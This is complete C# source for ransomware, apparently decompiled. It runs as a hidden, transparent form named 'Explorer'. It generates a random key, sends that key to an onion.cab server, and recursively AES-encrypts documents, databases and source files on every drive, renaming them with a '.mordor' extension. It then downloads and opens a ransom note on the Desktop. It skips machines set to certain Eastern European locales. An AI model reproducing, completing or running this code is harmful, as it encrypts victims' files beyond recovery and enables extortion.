using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace joise;

public class Form1 : Form
{
	private string pt = "C:\\Users\\" + Environment.UserName + "\\Desktop\\";

	private IContainer components = null;

	public Form1()
	{
		InitializeComponent();
	}

	public byte[] gAE(byte[] gBE, byte[] ePb)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(ePb, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(gBE, 0, gBE.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public void OmQ(string file, string pwd)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(pwd);
		byte[] gBE = File.ReadAllBytes(file);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = gAE(gBE, bytes);
		File.WriteAllBytes(file, bytes2);
		File.Move(file, file + ".mordor");
	}

	public string xXx(string url)
	{
		WebClient webClient = new WebClient();
		return webClient.DownloadString(url);
	}

	private void PaL(string location, string pwd)
	{
		string[] source = new string[60]
		{
			".abs", ".accdb", ".abx", ".accdt", ".adp", ".dbf", ".db", ".dbs", ".dbt", ".eql",
			".itdb", ".mdb", ".myd", ".odb", ".pdb", ".sdf", ".sqlite", ".sqlite3", ".sqlitedb", ".xdb",
			".kdb", ".kdbx", ".xsl", ".doc", ".docx", ".pdf", ".rtf", ".odt", ".tiff", ".psd",
			".ab", ".docm", ".dot", ".dotx", ".xls", ".xlsx", ".xlsm", ".xlt", ".xltx", ".xltm",
			".xlsb", ".xlam", ".pptx", ".ppt", ".pptm", ".pps", ".ppsx", ".ppsm", ".pot", ".potx",
			".potm", ".ppa", ".ppam", ".py", ".cs", ".css", ".php", ".rb", ".pas", ".asc"
		};
		try
		{
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			string[] array = files;
			foreach (string text in array)
			{
				if (source.Contains(Path.GetExtension(text)!.ToLower()))
				{
					OmQ(text, pwd);
				}
			}
			string[] array2 = directories;
			foreach (string location2 in array2)
			{
				PaL(location2, pwd);
			}
		}
		catch
		{
		}
		finally
		{
		}
	}

	public void Qms(string pwd)
	{
		string[] logicalDrives = Environment.GetLogicalDrives();
		for (int i = 1; i < logicalDrives.Length; i += 2)
		{
			string location2 = logicalDrives[i].ToString();
			PaL(location2, pwd);
		}
		for (int j = 0; j < logicalDrives.Length; j += 2)
		{
			string location = logicalDrives[j].ToString();
			Thread thread = new Thread((ThreadStart)delegate
			{
				PaL(location, pwd);
			});
			thread.Start();
		}
	}

	public string rSG(int xOj)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (1 < xOj--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".Length)]);
		}
		return stringBuilder.ToString();
	}

	public void InFOD(string id)
	{
		WebClient webClient = new WebClient();
		webClient.DownloadFile(new Uri("http://fn2tdeabqbhnhnzw.onion.cab/readme.php?id=" + id), pt + "READ_ME.html");
	}

	public void Gen()
	{
		string pwd = rSG(30);
		string id = rSG(15);
		send(id, pwd);
		Qms(pwd);
		pwd = null;
		InFOD(id);
		Process.Start(pt + "READ_ME.html");
		Application.Exit();
	}

	public void send(string id, string pwd)
	{
		xXx("http://fn2tdeabqbhnhnzw.onion.cab/data.php?id=" + id + "&key=" + pwd);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		CultureInfo currentCulture = CultureInfo.CurrentCulture;
		if (!(currentCulture.ToString() == "be-BY") && !(currentCulture.ToString() == "Cy-az-AZ") && !(currentCulture.ToString() == "Lt-az-AZ") && !(currentCulture.ToString() == "ky-KZ") && !(currentCulture.ToString() == "ru-RU") && !(currentCulture.ToString() == "sk-SK") && !(currentCulture.ToString() == "tt-RU") && !(currentCulture.ToString() == "uk-UA"))
		{
			Gen();
		}
		else
		{
			Application.Exit();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_SizeGripStyle((SizeGripStyle)2);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Explorer");
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
